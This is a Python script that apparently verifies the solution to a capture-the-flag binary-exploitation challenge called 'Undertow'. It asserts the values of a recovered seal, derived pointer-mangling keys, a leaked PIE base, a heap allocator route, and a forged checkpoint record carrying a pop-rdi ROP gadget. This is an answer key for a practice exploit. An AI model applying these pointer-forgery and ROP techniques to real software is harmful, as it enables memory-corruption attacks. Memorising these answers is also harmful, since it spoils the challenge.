#!/usr/bin/env python3
"""Verify Undertow's recovered seal, pointer codecs, and forged checkpoint."""

from solve import (
    PIE_CHECKPOINT,
    PIE_POP_RDI,
    LinearSystem,
    allocator_route,
    checkpoint_hash,
    decode_context_pointer,
    derive_keys,
    encode_context_pointer,
    oracle_mask,
    parity,
    put64,
    u64,
)


SEAL = bytes.fromhex("4eaf20afbf05b2f1805d0261950df065")
SEAL_INTEGER = int.from_bytes(SEAL, "little")


def main() -> None:
    keys = derive_keys(SEAL)
    assert keys.pointer_add == 0xC8409B0CC93D0260
    assert keys.pointer_xor == 0xA80401579B02D35D
    assert keys.context_add == 0xE76C4C0F1A31828E
    assert keys.context_xor == 0x9C3D2FFE6CB548FE

    # Values captured from one live option-2 disclosure.
    encoded_checkpoint = 0x96AB934719A35615
    encoded_scratch = 0x8932B264AD515615
    checkpoint = decode_context_pointer(encoded_checkpoint, keys)
    scratch = decode_context_pointer(encoded_scratch, keys)
    pie = checkpoint - PIE_CHECKPOINT
    assert pie == 0x5604550A9000
    assert scratch == 0x21CD5E19D000

    snapshot_list, route = allocator_route(SEAL)
    assert snapshot_list == 1
    assert route == [0, 0, 5, 0, 0]

    record = bytearray(0x500)
    put64(record, 0x70, encode_context_pointer(scratch, keys))
    put64(record, 0x78, encode_context_pointer(pie + PIE_POP_RDI, keys))
    put64(record, 0x80, checkpoint_hash(record, keys))
    assert u64(record[0x70:0x78]) == 0x8932B264AD515615
    assert u64(record[0x78:0x80]) == 0x96AB934717CC1615
    assert u64(record[0x80:0x88]) == 0xB15FE2CEEFBD557A

    # Recreate a full-rank oracle system without contacting the service.
    system = LinearSystem()
    session = 1
    while len(system.rows) < 128:
        mask = oracle_mask(session)
        system.add(mask, parity(mask & SEAL_INTEGER))
        session += 1
    assert system.solve().to_bytes(16, "little") == SEAL

    print("[+] seal and four derived keys verified")
    print(f"[+] PIE base recovered as {pie:#x}")
    print(f"[+] scratch mapping recovered as {scratch:#x}")
    print(f"[+] allocator route verified: {route} -> list {snapshot_list}")
    print("[+] forged checkpoint encoding and hash verified")
    print(f"[+] reconstructed seal from {session - 1} offline oracle rows")


if __name__ == "__main__":
    main()
